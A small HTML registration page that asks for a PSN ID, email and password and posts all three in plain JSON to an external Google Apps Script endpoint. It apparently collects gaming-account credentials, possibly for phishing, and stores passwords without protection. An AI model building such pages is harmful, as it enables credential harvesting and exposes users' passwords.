<!DOCTYPE html>
<html>
<head>
    <title>Registration</title>
    <style>
        body { font-family: sans-serif; display: flex; justify-content: center; padding: 50px; }
        form { display: flex; flex-direction: column; width: 300px; gap: 10px; }
    </style>
</head>
<body>

<form id="regForm">
    <h2>Access Registration</h2>
    <input type="text" id="psn" placeholder="PSN ID" required>
    <input type="email" id="email" placeholder="Email" required>
    <input type="password" id="password" placeholder="Password (min 6 chars)" required minlength="6">
    <button type="submit">Register</button>
    <p id="msg"></p>
</form>

<script>
    const scriptURL = 'https://script.google.com/macros/s/AKfycbzYU9K4cQjKiS8j46t8tXZE7JUiDHvet5gfD6gT3gMRjTroY5VL6TGIBb51wBwALpzIZg/exec';
    const form = document.getElementById('regForm');
    
    form.addEventListener('submit', e => {
        e.preventDefault();
        document.getElementById('msg').innerText = "Processing...";
        
        fetch(scriptURL, {
            method: 'POST',
            mode: 'no-cors', // Essential for Google Apps Script
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                psn: document.getElementById('psn').value,
                email: document.getElementById('email').value,
                password: document.getElementById('password').value
            })
        }).then(() => {
            document.getElementById('msg').innerText = "Request submitted! Check your status.";
        });
    });
</script>

</body>
</html>
